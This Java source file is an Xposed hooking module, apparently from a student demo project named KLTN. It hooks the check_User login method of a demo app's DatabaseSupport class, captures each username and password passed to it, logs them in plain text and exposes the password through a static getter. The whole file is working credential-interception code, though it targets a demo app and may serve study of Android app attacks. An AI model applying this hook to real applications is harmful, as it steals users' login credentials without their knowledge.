package com.kltn.hookdemo.hooking;

import android.util.Log;

import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;

public class LoginActivity {
    private static final String TAG = "KLTN2021";
    private static String username = null;
    private static String psw = null;

    public static void starthook(XC_LoadPackage.LoadPackageParam lpparam) throws NoSuchMethodException {

        XC_MethodHook info = new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                super.beforeHookedMethod(param);
                username = param.args[0].toString();
                psw = param.args[1].toString();

                Log.d(TAG, username + ":" + psw);
            }
        };

        try{
            findAndHookMethod("com.example.demoappkltn.DatabaseSupport", lpparam.classLoader,
                    "check_User", String.class, String.class, info);
        } catch (Exception e) {
            Log.e(TAG, "ERROR: " + e.getMessage());
        }
    }

    public static String getPsw (){
        return psw;
    }
}
